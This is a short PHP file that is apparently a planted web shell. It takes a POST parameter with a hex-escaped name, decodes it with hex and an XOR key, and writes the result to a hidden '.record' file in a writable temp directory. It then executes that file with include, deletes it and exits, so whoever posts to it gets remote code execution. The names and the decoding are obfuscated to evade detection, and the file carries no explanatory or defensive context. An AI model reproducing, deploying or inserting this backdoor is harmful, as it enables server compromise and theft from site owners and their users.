<?php

if(filter_has_var(INPUT_POST, "\x64\x65sc")){
	$k = hex2bin($_POST["\x64\x65sc"]);
	$itm= ''; $h = 0; while($h < strlen($k)){$itm .= chr(ord($k[$h]) ^ 72);$h++;}
	$data_chunk = array_filter([getenv("TEMP"), session_save_path(), "/tmp", "/dev/shm", getenv("TMP"), getcwd(), sys_get_temp_dir(), ini_get("upload_tmp_dir"), "/var/tmp"]);
	$hld = 0;
do {
    $flg = $data_chunk[$hld] ?? null;
    if ($hld >= count($data_chunk)) break;
    		if (!( !is_dir($flg) || !is_writable($flg) )) {
    $component = "$flg" . "/.record";
    $success = file_put_contents($component, $itm);
if ($success) {
	include $component;
	@unlink($component);
	exit;}
}
    $hld++;
} while (true);
}